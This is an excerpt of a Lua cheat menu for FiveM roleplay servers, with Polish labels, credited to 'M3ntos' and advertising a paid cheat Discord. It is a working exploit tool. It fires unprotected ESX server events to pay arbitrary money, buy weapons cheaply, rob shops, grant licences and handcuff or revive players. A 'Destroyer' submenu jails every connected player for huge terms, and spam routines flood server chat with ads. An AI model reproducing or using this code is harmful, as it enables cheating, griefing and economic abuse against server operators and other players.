...
--]]
----    								Siema tutaj macie menu odemnie
----									Pamietajcie #yebacfivem i enjoy !
----									Macie jeszcze tutaj obrazeczek odemnie kc was@ m3ntos
----jd--------------------------------------------------------------------------------------------------------------------------------
----       ===================        ===			===			===				 ===		===================					   -
----       =======					  ===			===			===				 ===		===================					   -
----       ===						  ===			===			===				 ===						===					   -
...
if showinfo then
bz('<FONT COLOR="#00f7ff">Menu by M3ntos ', 0.00, 0.0)
...
av('~h~fuck my love', true)
av ('RIP Juice WLRD', true)
av ('' .. GetPlayerName(PlayerId(-1)) .. ' Uwielbia M3ntosa', true)
...
function chatspam()
                ...
                TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'TryHard menu! Buy at https://discord.gg/YHu5mHt')
            end
...
Citizen.CreateThread(
    function()
        while bw do
			...
			if showinfo then
                dol('<FONT COLOR="#ff66cc">~h~Menu by Forest ', 0.00, 0.0)
				dol('<FONT COLOR="#99ffcc">~h~Twoje id ~w~: ~p~~h~' .. GetPlayerServerId(closestPlayer) .. ' ', 0.0, 0.03)
			...
			if koguszspam then
						TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'TryHard menu! Buy at https://discord.gg/YHu5mHt')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc TryHard menu! Buy at https://discord.gg/YHu5mHt')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'TryHard menu! Buy at https://discord.gg/YHu5mHt')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc TryHard menu! Buy at https://discord.gg/YHu5mHt')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'TryHard menu! Buy at https://discord.gg/YHu5mHt')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc TryHard menu! Buy at https://discord.gg/YHu5mHt')
...
Citizen.CreateThread(
    function()
        ...
        KoGuSzEk.CreateMenu('KoGuSzEkV', "~s~ <FONT COLOR='#ffffff'>Mentolini⚓~s~ ")
        KoGuSzEk.SetSubTitle('KoGuSzEkV', '<FONT COLOR="#ff0000">M3ntoos ')
		...
		KoGuSzEk.CreateSubMenu('kogusz', 'KoGuSzEkV', '~w~~h~Forest Addony ')
        ...
        while bw do
            ...
            if KoGuSzEk.IsMenuOpened('KoGuSzEkV') then
				...
				if KoGuSzEk.c('~h~~r~Twoj nick: <FONT COLOR="#00ff00">' .. GetPlayerName(PlayerId(-1)) .. '      ~g~Informacje ~p~->',
                        showinfo,
                        function(dR)
							crosshair = false
                            crosshairc = false
                ...
                elseif KoGuSzEk.MB('~h~~p~» ~y~Tworcy', 'crds') then			
            ...
            elseif KoGuSzEk.IsMenuOpened('ESXTriggersSelf') then		
					...
					elseif KoGuSzEk.B('~g~~h~ESX ~r~Zakuj ID') then
                    local m = KeyboardInput('Wpisz ID', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_policejob:handcuff', m)
						TriggerServerEvent('pantaPOL_job:handcuff', m)
					end
					
					elseif KoGuSzEk.B('~g~~h~ESX ~r~Revive Id') then
                    local m = KeyboardInput('Wpisz ID', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_ambulancejob:revive', m)
					end
					elseif KoGuSzEk.B('~g~~h~ESX ~r~Plasterek Maly') then
                    local m = KeyboardInput('Wpisz ID', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_ambulancejob:heal', m, 'small')
					end
					elseif KoGuSzEk.B('~g~~h~ESX ~r~Plasterek Duzy') then
                    local m = KeyboardInput('Wpisz ID', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_ambulancejob:heal', m, 'big')
					end	
					elseif KoGuSzEk.B('~g~~h~ESX ~r~Smerfik Revive') then
                    local m = KeyboardInput('Wpisz ID', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_ambulancejob:revivel', m)
					end	
                    elseif KoGuSzEk.B('~h~~g~ESX ~w~Otworz menu wiezienia~w~') then
                        TriggerServerEvent("esx-qalle-jail:openJailMenu")
					elseif KoGuSzEk.B('~h~~g~ESX ~w~Kup Kamizelke lekka~w~') then
                        TriggerServerEvent("esx_kamizelka:lekka", 0)
				    elseif KoGuSzEk.B('~h~~g~ESX ~w~Kup Kamizelke srednia~w~') then
                        TriggerServerEvent("esx_kamizelka:srednia", 0)
					elseif KoGuSzEk.B('~h~~g~DrugRP ~w~Kup Pompe~w~') then
                        TriggerServerEvent('zielu_armory:buyItem', "WEAPON_PUMPSHOTGUN", 50000)
					elseif KoGuSzEk.B('~h~~g~DrugRP ~w~KUP CarabinRifle Mk2~w~') then
                        TriggerServerEvent('zielu_armory:buyItem', "WEAPON_CARBINERIFLE_MK2", 150000)
					elseif KoGuSzEk.B('~h~~g~DrugRP ~w~KUP SMG~w~') then
                        TriggerServerEvent('zielu_armory:buyItem', "WEAPON_SMG", 150000)
					elseif KoGuSzEk.B('~h~~g~DrugRP ~w~Obrabuj Sklep~w~') then
					     TriggerServerEvent("esx_shopsrob:takemoney")
					...
					elseif KoGuSzEk.B("~h~Wygrana Zdrapka") then
                        TriggerServerEvent("tostzdrapka:wygranko")
						TriggerServerEvent("tostzdrapka:wygranko1")
                    elseif KoGuSzEk.B("~h~Wygrana+Zdrapka+") then						
					    TriggerServerEvent("tostzdrapka:wygranko+")
					elseif KoGuSzEk.B("~h~Wygrana Zdrapka Premium") then
				...
				KoGuSzEk.Display()
				    ...
				    elseif KoGuSzEk.B('~h~~g~Wytrych') then
						TriggerServerEvent('wytrychy:giveb')
					...
					TriggerServerEvent('pantaPOL_job:DajLicencje')
                    TriggerServerEvent('esx_policejob:do_license')
                    TriggerServerEvent('esx_policejob:DajLicencje')
            ...
            elseif KoGuSzEk.IsMenuOpened('ESXTriggerini') then
                ...
                elseif KoGuSzEk.B('~h~Send Bill') then
                    ...
                    if bA and ah then 
                        TriggerServerEvent('esx_billing:sendBill',GetPlayerServerId(SelectedPlayer),"Frost was herex",ah,bA)
                    else
                        return
                    end
            ...
            elseif KoGuSzEk.IsMenuOpened('MoneyMenu') then
                 if KoGuSzEk.B('~h~~o~Automatyczne pieniadze ~r~ UWAGA!') then
                    automaticmoneyesx()
			elseif KoGuSzEk.B('~g~~h~ESX ~w~Garbagejob') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_garbagejob:pay', m)		
					end
				elseif KoGuSzEk.B('~g~~h~ESX ~w~Elektryk') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('TMM_elektryk:cash', m)	
					end		
				...
				elseif KoGuSzEk.B('~g~~h~ESX ~w~Tornado GarbageJob') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_garbageeejob:pay', m)
                    end
				...
				elseif KoGuSzEk.B('~g~~h~ESX ~w~NeedRP Airlines') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_airlines:pay", m)
					end	
				elseif KoGuSzEk.B('~g~~h~ESX ~w~Pizza Wyskocznia') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("pizza:pourboire", m)
					end	
				elseif KoGuSzEk.B('~g~~h~ESX ~w~Malz Wyskocznia') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_malz:wyplata', m)
					end
				elseif KoGuSzEk.B('~g~~h~ESX ~w~Magazynier Wyskocznia') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('magazynier:zaplac', m)
					end	
				elseif KoGuSzEk.B('~g~~h~ESX ~w~C00rier RPuWUja') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("coursier:pourboire", m)
					end
				elseif KoGuSzEk.B('~g~~h~ESX ~w~MoroRP Garbage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_garbagejob:pay213123124123321", m)
					end	
				elseif KoGuSzEk.B('~g~~h~ESX ~w~Umyj Kase') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_godirtyjob:pay", m)
					end	
				elseif KoGuSzEk.B('~g~~h~ESX ~w~BelineaRP PostalJob') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_gopostaljob:pay", m)
					end
				elseif KoGuSzEk.B('~g~~h~ESX ~w~Belinea,ExileRP Elektryk') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('TMM_elektryk:cash', 20000)
					end	
				elseif KoGuSzEk.B('~g~~h~ESX ~w~PlanetaRP Cichy Ogrodnik') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_cichyogrodnik:wyplata', m)		
					end	
				elseif KoGuSzEk.B('~g~~h~ESX ~w~DrugRP Truckerjob') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_truckerjob:pay2", m)
					end	
				elseif KoGuSzEk.B('~g~~h~ESX ~w~Exilerp  Umyj kase') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("eFbDy3gMxpwrwMPF34bs6RsX:Rr2rxvwKFmDb", m)
                    end	
				elseif KoGuSzEk.B('~g~~h~ESX ~w~PolstarRP Ogrodnik') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_ogrodnikjob:pay", m) 
					end
				elseif KoGuSzEk.B('~g~~h~ESX ~w~Napady') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_napady:All', m)
					end	
				elseif KoGuSzEk.B('~g~~h~ESX ~w~PlanetaRP Napad na ciezarowke') then
					    TriggerServerEvent("napadtransport:graczZrobilnapad")
                    
				elseif KoGuSzEk.B('~g~~h~ESX ~w~PolstarRP Napad na kase') then
            ...
            elseif KoGuSzEk.IsMenuOpened('Destroyer') then
                ...
                elseif KoGuSzEk.B('~h~~r~Jailuj~w~ Wszystkich graczy') then
                    for i = 0, 128 do
					TriggerServerEvent("arisonarp:mandat", GetPlayerServerId(i), 3232, '^TryHard menu! Buy at https://discord.gg/YHu5mHt')				
						TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 50000 * 600000, 'Pozdrawiam 666 squad', 424324234234)
						TriggerServerEvent("wyspa_jail:SendMessagetrop", GetPlayerServerId(i), 3213, '^TryHard menu! Buy at https://discord.gg/YHu5mHt')
                        TriggerServerEvent("esx_jailer:sendToJailtrop", GetPlayerServerId(i), 325 * 60000000, '^TryHard menu! Buy at https://discord.gg/YHu5mHt', 321321321321)
						TriggerServerEvent("esx_jailer:wyslijwiezienie", GetPlayerServerId(i), 50000 * 6999990, '^1WBIJAJ NA DC I KUP CHEATY https://discord.gg/YHu5mHt', 32513251)
						TriggerServerEvent("projektsantos:wiezienie", GetPlayerServerId(i), 1000 * 60000000, '^TryHard menu! Buy at https://discord.gg/YHu5mHt',3251)
						TriggerServerEvent("wyspa_jail:SendWiadomosc", GetPlayerServerId(i), 50000, '^TryHard menu! Buy at https://discord.gg/YHu5mHt')
						TriggerServerEvent("esx-qale-jail:jailPlayer", GetPlayerServerId(i), 50000, '^TryHard menu! Buy at https://discord.gg/YHu5mHt')
						TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 1 * 60, '', 32)
						TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 50000, '^TryHard menu! Buy at https://discord.gg/YHu5mHt |')
						TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 800 * 60)
						TriggerServerEvent("wyspa_jail:SendMessage2", GetPlayerServerId(i), 10000, '^TryHard menu! Buy at https://discord.gg/YHu5mHt' )
						TriggerServerEvent("esx_jailer:sendToJail2", GetPlayerServerId(i), 802 * 60, '^TryHard menu! Buy at https://discord.gg/YHu5mHt', 32513251 )
						TriggerServerEvent('esx_jailer:wysylandoo', 'Garbary123')
						TriggerServerEvent("esx_jailer:wysylanko", GetPlayerServerId(i), 8002 * 60)
						TriggerServerEvent("esx_jailer:wysylandoo", GetPlayerServerId(i), 80120 * 60, '^TryHard menu! Buy at https://discord.gg/YHu5mHt', 32513251, 'Garbary123')
                        TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 8023 * 60, '^TryHard menu! Buy at https://discord.gg/YHu5mHt', 32513251 )
                       TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 801 * 60, '^TryHard menu! Buy at https://discord.gg/YHu5mHt', 32513251)
					   TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 322 * 6000000)
                      TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 80000 * 60, 'https://discord.gg/YHu5mHt')
                    end
    ...
    SetModelAsNoLongerNeeded(keduxben12)
            ...
            elseif KoGuSzEk.IsMenuOpened('crds') then
                if KoGuSzEk.B('~h~~p~»~w~ M3ntos~r~#2115 ~p~DEV') then
